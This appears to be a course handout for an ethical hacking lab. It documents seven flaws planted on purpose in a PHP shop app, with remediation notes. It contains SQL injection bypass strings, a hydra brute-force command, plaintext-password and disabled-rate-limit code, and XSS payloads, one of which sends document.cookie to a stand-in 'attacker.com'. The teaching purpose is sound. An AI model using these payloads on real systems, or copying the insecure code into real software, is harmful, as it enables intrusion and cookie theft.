# PeakPH Commerce - Penetration Testing Vulnerabilities

This document outlines all intentional security vulnerabilities introduced for ethical hacking/penetration testing course activities.

## ⚠️ WARNING
**These vulnerabilities are INTENTIONAL and MUST NOT be deployed to production or public environments.**
This is strictly for educational purposes in a controlled testing environment.

---

## Vulnerabilities Introduced

### 1. SQL INJECTION 🔴 CRITICAL

**Location:** `auth/login_handler.php`, `auth/signup_handler.php`, `admin/login_handler.php`

**Description:**
- Removed prepared statements
- Using direct SQL concatenation with user input
- Allows attackers to inject SQL commands through login/signup fields

**Vulnerable Code Example:**
```php
// In login_handler.php line ~50
$query = "SELECT id, username, email, password, role, status FROM users WHERE email = '$email' AND role = 'User'";
$result = $conn->query($query);
```

**Test Cases:**
- Email: `' OR '1'='1`
- Email: `admin@test.com' --`
- Email: `' UNION SELECT * FROM users --`

**Attack Methods:**
- Authentication bypass
- Database enumeration
- Data exfiltration
- Privilege escalation

---

### 2. CROSS-SITE SCRIPTING (XSS) 🔴 CRITICAL

**Locations:** 
- `components/auth_modal.php` (removed `htmlspecialchars()`)
- `checkout.php` (removed `htmlspecialchars()`)
- Form inputs changed from `type="email"` to `type="text"`
- Form inputs changed from `type="password"` to `type="text"`

**Description:**
- Removed output encoding with `htmlspecialchars()`
- User input is now directly echoed to HTML/JavaScript
- Allows script injection through login/signup forms

**Vulnerable Code Example:**
```php
// In auth_modal.php line ~105
echo '<img src="' . $imagePath . '" alt="...">';  // No htmlspecialchars()
```

**Test Cases:**
- Full Name: `<img src=x onerror=alert('XSS')>`
- Email: `<script>alert('XSS Attack')</script>`
- Password: `"><script>fetch('http://attacker.com')</script>`

**Attack Methods:**
- Session hijacking (stealing session cookies)
- Credential theft via fake login forms
- Malware distribution
- Defacement

---

### 3. BRUTE FORCE ATTACK 🔴 CRITICAL

**Location:** `includes/security.php`

**Description:**
- Rate limiting function `checkRateLimit()` disabled
- Function now always returns `true` (always allows login attempt)
- No delay or blocking after failed attempts
- Unlimited login attempts possible

**Vulnerable Code Example:**
```php
// In security.php line ~8-11
function checkRateLimit($action, $identifier, $max_attempts = 5, $window = 300) {
    // VULNERABILITY: Rate limiting disabled - always returns true
    return true;
}
```

**Test Cases:**
- Automated password guessing tools can attack without restrictions
- Try default credentials repeatedly (admin@peakph.com / 12345)
- Dictionary attacks on user accounts

**Attack Methods:**
- Dictionary attacks
- Rainbow table attacks
- Default credential exploitation
- Credential stuffing

---

### 4. INPUT VALIDATION REMOVED 🟡 HIGH

**Locations:**
- `components/auth_modal.php` - Signup/Login forms
- `admin/login.php` - Admin login form
- Form fields changed from `required` to optional
- Password fields changed from `minlength="6"` to no length requirement

**Description:**
- Removed HTML5 validation attributes (`required`, `minlength`)
- Input type changed from `type="email"` to `type="text"`
- Input type changed from `type="password"` to `type="text"`
- Backend validation also removed for quick, unfiltered processing

**Vulnerable Code Examples:**
```php
// In auth_modal.php - Before
<input type="email" name="email" required />

// In auth_modal.php - After  
<input type="text" name="email" />
```

**Impact:**
- SQL injection becomes easier to exploit
- XSS attacks easier to deliver
- Weak passwords accepted
- No server-side sanitization

---

### 5. NO PASSWORD HASHING 🟡 HIGH

**Location:** `auth/signup_handler.php`, `admin/login_handler.php`

**Description:**
- Removed `password_hash()` function
- Passwords stored in plain text
- User credentials easily readable if database is compromised

**Vulnerable Code Example:**
```php
// In signup_handler.php - Before
$hashed_password = password_hash($password, PASSWORD_DEFAULT);
$insert_query = "INSERT INTO users (...) VALUES (?, ?, ?, ...)";

// In signup_handler.php - After
$insert_query = "INSERT INTO users (username, email, password, role, status) VALUES ('$full_name', '$email', '$password', 'User', 'Active')";
```

**Impact:**
- Password database compromise = immediate access
- Credential reuse if user has same password elsewhere
- No complexity validation

---

### 6. NO AUDIT LOGGING 🟡 HIGH

**Location:** `auth/login_handler.php`, `auth/signup_handler.php`

**Description:**
- Removed logging to `audit_trail` table
- No record of failed login attempts
- No accountability for account creation
- Difficult to detect attacks after the fact

**Vulnerable Code Example:**
```php
// Removed from login_handler.php:
// $log_query = "INSERT INTO audit_trail (table_name, record_id, action, ...)";
// executeQuery($log_query, [...], 'sisssss');
```

**Impact:**
- Attackers leave no audit trail
- Delayed breach detection
- No forensic evidence

---

### 7. WEAK COOKIE SECURITY 🟡 HIGH

**Location:** `admin/login_handler.php`

**Description:**
- Remember me cookie uses base64 encoding (not encryption)
- Base64 is trivially easy to decode
- Cookie contains email and timestamp in plain text

**Vulnerable Code Example:**
```php
$cookie_value = base64_encode($email . ':' . time());
setcookie('admin_remember', $cookie_value, time() + (30 * 24 * 60 * 60), '/');
```

**Test:**
```bash
echo -n "admin@peakph.com:1717896000" | base64
# Outputs: YWRtaW5AcGVha3BoLmNvbToxNzE3ODk2MDAw
```

**Impact:**
- Cookie easily forged
- Session hijacking
- Unauthorized admin access

---

## Testing Recommendations

### For SQL Injection Testing:
1. Use tools like SQLmap
2. Try manual payload injection in login/signup forms
3. Attempt to enumerate database structure
4. Try to bypass authentication

### For XSS Testing:
1. Use Burp Suite or OWASP ZAP
2. Inject JavaScript payloads in form fields
3. Capture session cookies with XSS payloads
4. Steal credentials via fake login form

### For Brute Force Testing:
1. Use Hydra, Medusa, or similar tools
2. Try common credential combinations
3. Perform dictionary attacks
4. Measure response times (no rate limiting delays)

### For Other Vulnerabilities:
1. Check cookies in browser developer tools
2. Review network traffic with Burp Suite
3. Inspect HTML source for validation attributes
4. Test with various input types (unicode, encoding, etc.)

---

## Proof of Concepts

### SQL Injection Login Bypass
```
Email: ' OR '1'='1' --
Password: anything
```

### XSS Payload (Stored)
```
Name: <img src=x onerror="document.location='http://attacker.com/steal?cookie='+document.cookie">
```

### Brute Force
```bash
hydra -l admin@peakph.com -P wordlist.txt localhost http-post-form "/admin/login_handler.php:email=^USER^&password=^PASS^:login=failed"
```

---

## Remediation Notes

When securing the application, you'll need to:

1. **SQL Injection:**
   - Restore prepared statements with parameterized queries
   - Use `executeQuery()` function properly with placeholders
   - Validate/sanitize all inputs on server-side

2. **XSS:**
   - Restore `htmlspecialchars()` in output
   - Use `type="email"` for email fields
   - Implement Content Security Policy (CSP) headers

3. **Brute Force:**
   - Restore rate limiting in `security.php`
   - Implement exponential backoff
   - Add CAPTCHA after failed attempts

4. **Input Validation:**
   - Restore `required`, `minlength` attributes
   - Implement server-side validation
   - Add password complexity requirements

5. **Password Security:**
   - Restore `password_hash()` with `PASSWORD_DEFAULT`
   - Use `password_verify()` for authentication

6. **Audit Logging:**
   - Restore logging to `audit_trail` table
   - Log all authentication attempts
   - Monitor for suspicious patterns

7. **Session Security:**
   - Use cryptographic signing for cookies
   - Implement proper expiration
   - Use HTTPOnly and Secure flags

---

## Important Notes

✅ **These vulnerabilities are designed for:**
- Learning security testing methodologies
- Understanding common web application vulnerabilities
- Practicing exploitation techniques in a safe environment
- Improving secure coding practices

❌ **DO NOT:**
- Use this for unauthorized testing
- Deploy to production
- Share credentials/attack methods inappropriately
- Cause any disruption to systems

---

**Last Updated:** 2026-06-07  
**Status:** Ready for Ethical Hacking Course Activities
